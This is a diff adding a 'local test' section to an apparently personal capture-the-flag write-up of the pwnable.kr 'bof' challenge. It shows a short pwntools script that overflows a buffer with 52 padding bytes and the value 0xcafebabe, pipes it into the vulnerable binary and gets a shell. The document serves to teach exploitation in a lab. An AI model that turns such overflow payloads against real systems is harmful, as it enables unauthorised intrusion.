@@ -864,6 +864,24 @@ $ cat flag
 daddy, I just pwned a buFFer :)
 ```
 
+Local test:
+
+```
+[~/Desktop] 
+$ cat payload.py 
+from pwn import *
+import sys
+payload = b"A"*52 + p32(0xcafebabe)
+sys.stdout.buffer.write(payload)
+
+[~/Desktop] 
+$ (python payload.py; cat)  | ./bof 
+overflow me : 
+
+whoami
+connor
+```
+
 
 # flag - pwnable.kr
 
